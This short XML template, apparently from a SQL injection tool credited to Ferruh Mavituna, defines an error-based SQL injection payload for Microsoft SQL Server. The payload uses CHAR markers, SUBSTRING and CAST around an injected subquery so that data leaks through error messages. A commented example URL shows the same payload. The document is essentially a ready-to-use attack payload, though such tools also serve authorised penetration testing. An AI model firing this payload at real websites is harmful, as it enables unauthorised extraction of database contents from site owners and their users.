<bsql>
  <author>
    Ferruh Mavituna - http://ferruh.mavituna.com
  </author>
  <name>Template - SQL Server - Error Based SQL Injection</name>
    
  <query><![CDATA[{{URL:Enter the URL http://www.example.com/}}/?p=CHAR(95)+CHAR(33)+CHAR(64)+SUBSTRING(CAST(({INJECTION}) AS varchar(3000)),{POSITION},{ERROR_BUFFER})+CHAR(95)+CHAR(33)+CHAR(64)--]]></query>
	<detectiontype><![CDATA[ErrorBased]]></detectiontype>
</bsql>

<!-- 
  http://example.com/SQLInjection-Numeric/?p=CHAR(95)+CHAR(33)+CHAR(64)+SUBSTRING(CAST(({INJECTION}) AS varchar(3000)),{POSITION},{ERROR_BUFFER})+CHAR(95)+CHAR(33)+CHAR(64)
  -->